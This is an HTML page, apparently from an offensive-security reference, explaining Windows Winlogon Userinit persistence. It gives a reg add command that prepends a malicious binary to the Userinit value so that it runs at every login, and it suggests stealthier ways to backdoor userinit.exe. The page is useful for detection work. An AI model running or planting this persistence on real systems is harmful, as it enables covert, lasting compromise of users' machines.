<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>WinLogon / Userinit</title>
</head><body>the Userinit registry key defines which programs are run by Winlogon when a user logs in to the system. Typically Winlogon runs Userinit.exe, which in turn runs logon scripts, reestablishes network connections, and then starts explorer.<br/>
<br/>
Below we can see the &quot;default&quot; content for the Winlogon registry key.<br/>
<br/>
# Windows 7 machine.	<br/>
C:\Windows\system32&gt; reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;<br/>
<br/>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br/>
  ReportBootOk  REG_SZ  1<br/>
  Shell  REG_SZ  explorer.exe<br/>
  PreCreateKnownFolders  REG_SZ  {A520A1A4-1780-4FF6-BD18-167343C5AF16}<br/>
  Userinit  REG_SZ  C:\Windows\system32\userinit.exe<br/>
  VMApplet  REG_SZ  SystemPropertiesPerformance.exe /pagefile<br/>
  AutoRestartShell  REG_DWORD  0x1<br/>
  Background  REG_SZ  0 0 0<br/>
  CachedLogonsCount  REG_SZ  10<br/>
  DebugServerCommand  REG_SZ  no<br/>
  ForceUnlockLogon  REG_DWORD  0x0<br/>
  LegalNoticeCaption  REG_SZ<br/>
  LegalNoticeText  REG_SZ<br/>
  PasswordExpiryWarning  REG_DWORD  0x5<br/>
  PowerdownAfterShutdown  REG_SZ  0<br/>
  ShutdownWithoutLogon  REG_SZ  0<br/>
  WinStationsDisabled  REG_SZ  0<br/>
  DisableCAD  REG_DWORD  0x1<br/>
  scremoveoption  REG_SZ  0<br/>
  ShutdownFlags  REG_DWORD  0x5<br/>
  AutoAdminLogon  REG_SZ  0<br/>
  DefaultUserName  REG_SZ  Fubar<br/>
<br/>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions<br/>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked<br/>
<br/>
There is (almost) no legitimate reason to modify the &quot;Userinit&quot; registry key so if you ever encounter a non-default value here you should hear alarm bells going off. As it turns out we can simply modify the key and prepend the userinit.exe executable with our own malicious binary/script<br/>
<br/>
C:\Windows\system32&gt; reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit<br/>
/t REG_SZ /d &quot;C:\Some\Evil\Binary.exe&quot;,&quot;C:\Windows\system32\userinit.exe&quot;<br/>
<br/>
Value Userinit exists, overwrite(Yes/No)? Yes<br/>
The operation completed successfully.<br/>
<br/>
<br/>
With the modification shown above any user login will trigger the execution of our evil &quot;Binary.exe&quot;. This is definitely pretty obtrusive. For stealth purposes it would be much better to backdoor the userinit executable or rename it and load a different binary (with the same name) that has an epilog which calls the original executable.</body></html>